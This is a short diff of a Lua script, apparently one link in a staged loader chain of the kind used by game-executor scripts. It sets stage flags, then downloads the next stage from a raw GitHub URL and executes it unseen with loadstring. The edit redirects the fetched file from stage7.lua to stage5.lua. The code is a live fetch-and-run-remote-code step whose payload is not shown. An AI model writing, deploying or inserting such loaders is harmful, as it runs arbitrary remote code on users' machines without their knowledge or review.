@@ -389,6 +389,6 @@ _G["_ArN_Stage4"] = true
 _G["_ArN_Stage5"] = true
 _G["_ArN_Stage6"] = true
 
-local _next_url = "https://raw.githubusercontent.com/Vexol-files/arch/refs/heads/main/static_content/stage7.lua"
+local _next_url = "https://raw.githubusercontent.com/Vexol-files/arch/refs/heads/main/static_content/stage5.lua"
 local _next_res = _req({Url = _next_url, Method = "GET"})
 pcall(function() loadstring(_next_res.Body)() end)
